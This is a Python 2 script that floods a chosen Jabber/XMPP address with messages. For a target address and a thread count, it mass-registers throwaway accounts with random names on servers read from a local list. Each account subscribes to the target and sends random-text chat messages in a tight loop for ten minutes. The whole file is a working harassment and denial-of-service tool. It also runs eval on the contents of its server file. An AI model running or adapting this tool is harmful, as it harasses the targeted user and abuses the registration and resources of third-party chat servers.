#! /usr/bin/env python
# -*- coding: utf-8 -*-


import os, time, sys, time, pdb, urllib, threading, types, random

i=os.path.dirname(__file__)
i=list(os.path.split(i));i.pop(len(i)-1);i=''.join(i)
sys.path.insert(0, os.path.join(i,'modules'))


import xmpp

if len(sys.argv)!=3:
    sys.exit(0)

TIME_SJID = {'work': 0,'run': 0}

SP_STOP_TIM={}


def generate_iq(_len = None, sg = None):
  if sg == None:
    sg = 'aoeuizxcvb_nmsdfghjklqwrtyp1234567890'
  if _len == None:
    _len = random.Random().randint(1, 100)
  s = ''
  l = len(sg)
  while _len > 0:
    s += sg[random.Random().randint(0, l - 1)]
    _len -= 1
  return s
    
    
def handler_spamjid_go(jid_, n):
    global TIME_SJID
    TIME_SJID['work']=1
    if isinstance(n, str):
        n=int(n)
    threading.Thread(None, handler_sp_time,'thr'+str(random.randrange(0, 999))).start()
    for x in range(0, n):
        threading.Thread(None, handler_run_spamjid, 'thr'+str(random.randrange(0, 999)), (jid_, n)).start()

def handler_sp_time():
    global TIME_SJID
    time.sleep(600)
    TIME_SJID['work']=0


def handler_run_spamjid(jid_, n):
    global i
    bvc, dcc = generate_iq(random.Random().randint(5,10)), ''
    try:
        SPAMS = i+'/dynamic/spamserv.txt'
        fp = open(SPAMS, 'r')
        dcc = eval(fp.read())
        fp.close()
    except: return
    if not dcc: return
    gserv = random.choice(dcc)
    name, domain, password, newBotJid, mainRes = bvc, gserv, generate_iq(random.Random().randint(5,10)), 0,'QIP'
    #print u'START'
    node = unicode(name)
    lastnick = name
    jid = xmpp.protocol.JID(node=node, domain=domain, resource=mainRes)
    cl = xmpp.Client(jid.getDomain(), debug=[])
    con=cl.connect()
    if not con:
        handler_run_spamjid(jid_, n)
        return
    try: xmpp.features.register(cl, domain, {'username': node, 'password':password})
    except:
        handler_run_spamjid(jid_, n)
        return
    au=cl.auth(jid.getNode(), password, jid.getResource())
    if not au:
        print 'Not registered in to '+unicode(domain)
        handler_run_spamjid(jid_, n)
        return
    cl.sendInitPresence()
    print u'New jid: '+unicode(jid.getNode())+'@'+unicode(domain)
    try:
        rostget = cl.getRoster()
        rostget.Subscribe(unicode(jid_))
    except: pass
    #print u'Sending_Subscribe'
    spame_jid_start(jid_, cl)
  
def spame_jid_start(jid, cl):
    global TIME_SJID
    time.sleep(2)
    while TIME_SJID['work']==1:
        try:
            gen = generate_iq(random.Random().randint(5,10))
            cl.send(xmpp.protocol.Message(jid,gen,'chat'))
        except (IOError,AttributeError): pass
    print 'Done!'
    try: cl.disconnect()
    except (IOError,AttributeError): return

handler_spamjid_go(sys.argv[1],sys.argv[2])
  
